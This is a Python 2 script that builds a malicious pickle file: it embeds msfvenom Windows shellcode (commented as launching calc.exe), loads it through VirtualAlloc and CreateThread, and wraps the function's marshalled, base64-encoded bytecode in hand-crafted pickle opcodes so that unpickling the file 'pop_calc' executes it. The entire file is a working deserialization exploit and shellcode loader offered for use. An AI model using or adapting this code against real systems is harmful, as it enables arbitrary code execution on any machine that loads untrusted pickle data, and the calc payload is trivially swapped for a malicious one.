import base64
import marshal

def marshal_encode(func_code):
    return base64.b64encode(marshal.dumps(func_code))

def payload():
    import ctypes
    # this payload pops calc: msfvenom -p windows/exec CMD=calc.exe -f p
    buf =  ""
    buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
    buf += "\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    buf += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
    func = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                        ctypes.c_int(0x1000),
                                        ctypes.c_int(0x3000),
                                        ctypes.c_int(0x40))
    ctypes.cdll.msvcrt.memcpy(ctypes.c_int(func), buf, ctypes.c_int(len(buf)))
    thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                ctypes.c_int(0),
                                                ctypes.c_int(func),
                                                ctypes.c_int(0),
                                                ctypes.c_int(0),
                                                ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread), ctypes.c_int(-1))

encoded_payload = marshal_encode(payload.func_code)
    
# format it as a pickle
pickled_payload = "ctypes" + "\n"
pickled_payload += "FunctionType" + "\n"
pickled_payload += "(cmarshal" + "\n"
pickled_payload += "loads" + "\n"
pickled_payload += "(cbase64" + "\n"
pickled_payload += "b64decode" + "\n"
pickled_payload += "(S'" + encoded_payload + "'" + "\n"
pickled_payload += "tRtRc__builtin__" + "\n"
pickled_payload += "globals" + "\n"
pickled_payload += "(tRS''" + "\n"
pickled_payload += "tR(tR."

# write the payload to disk for use later
f = open('pop_calc', 'wb')
f.write(pickled_payload)
f.close()